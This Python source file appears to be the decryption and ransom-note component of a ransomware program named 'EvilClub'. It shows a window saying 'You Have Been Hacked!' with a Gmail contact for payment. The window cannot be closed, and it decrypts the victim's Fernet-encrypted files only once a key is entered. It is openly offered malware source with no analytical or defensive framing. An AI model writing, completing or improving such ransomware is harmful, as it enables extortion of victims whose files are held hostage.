
import EvilClub_enc
import discover
import modify
import os
from cryptography.fernet import Fernet
from tkinter import *
from tkinter import messagebox
from threading import Thread
from time import sleep
from tkinter import ttk
import binascii

class EvilClub_dec:

    def __init__(self,):
        self.extention = discover.extensions
        self.thread_list=[]
        # self.key = input('[+] Enter the secret key! >>>>>>>>> ').encode()


    def decrypt(self, file_name):
        try:
            modify.encrypt(file_name, self.crypt.decrypt)
        except binascii.Error as e:
            messagebox.showerror('Erro', 'sotty but your key was send to the server!')
        try:
            os.rename(file_name, file_name.strip('.evil_club'))
        except Exception as e:
            try:
                os.rename(file_name, file_name.split('.')[0]+'.jpg')
            except:
                pass

    def get_all_imgs(self):
        for img in os.listdir("Wallpaper"):
            yield "Wallpaper/"+img
            
    def make_gui(self):

        def get_key():
            self.key = str(key.get()).encode()
            if not self.key or len(self.key) < 40:
                messagebox.showerror('[!] Liar Liar Ass on Fire', 'You cant trick me')
            else:
                t = Thread(target=self.run)
                t.start()

        def disable_event():
            messagebox.showerror('[+] Sorry :)', 'You Cant Close ME!')

        self.root = Tk()
        self.root.protocol("WM_DELETE_WINDOW", disable_event)
        self.root.title("EvilClub :(")
        self.root.geometry("700x500")
        self.root.configure(background='#124567')

        label1 = Label(self.root, text="You Have Been Hacked!", font=("Fixedsys", 17))
        label1.pack(pady="30")

        label3 = Label(self.root, text="Contact Me Gmail!, youngeneral101@gmail.com", font=("Fixedsys", 15))
        label3.pack(pady="10")


        label2 = Label(self.root, text="Enter The Key To Decrypt The File!", font=("Fixedsys", 17))
        label2.pack(pady="10")

        key = Entry(self.root, width="50")
        key.configure(font=("Fixedsys", 15))
        key.pack(pady="20")


        button2 = Button(self.root, text="Decrypt!", font=("Fixedsys", 17))
        button2.configure(font=("Fixedsys", 17), background="#645872", command=get_key)
        button2.pack(pady="10")

        self.root.mainloop()

    def finall_decrypt(self, img):
        try:
            self.decrypt(file_name=img)
        except Exception as e:
            pass

    def thread_checker(self, times=30):
        counter = 0
        while 1:
            for thread in self.thread_list:
                if not thread.isAlive():
                    self.thread_list.remove(thread)
                    counter += 1
                    print("\r[+] counter {}".format(counter), end="")
            if counter == times:
                print("\rthreads {}".format(len(self.thread_list)), end="")
                break

    def run(self):

        counter = 0

        imgs = discover.finall_discover()

        self.crypt = Fernet(self.key)

        for img in imgs:
            t = Thread(target=self.finall_decrypt, args=([img]))
            t.start()
            sleep(0.1)
            self.thread_list.append(t)
            counter += 1
            if counter % 30 == 0:
                print("\rnow it's 10 thread :)", end="")
                self.thread_checker()
        messagebox.showinfo("Thank's for paying","We Hope To Not See Your Face In The Future :)")
        self.root.destroy()

def main():
    EvilClub_ded = EvilClub_dec()
    EvilClub_ded.make_gui()
if __name__ == '__main__':
    main()